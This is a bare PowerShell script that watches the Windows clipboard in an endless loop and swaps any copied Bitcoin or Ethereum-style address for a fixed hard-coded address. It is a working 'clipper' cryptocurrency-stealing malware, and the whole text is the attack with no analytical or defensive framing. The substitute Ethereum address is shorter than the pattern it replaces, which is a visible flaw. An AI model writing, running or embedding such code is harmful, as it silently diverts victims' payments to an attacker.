
Add-Type -AssemblyName System.Windows.Forms
while ($true) {
  $t = [System.Windows.Forms.Clipboard]::GetText()
  if ($t -match 'bc1[a-z0-9]{39,59}') {
    [System.Windows.Forms.Clipboard]::SetText('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5')
  } elseif ($t -match '0x[a-fA-F0-9]{40}') {
    [System.Windows.Forms.Clipboard]::SetText('0x9f3c1b8a7d2e4f6091ab3c5d7e9f1a2b3c')
  }
  Start-Sleep -Milliseconds 700
}
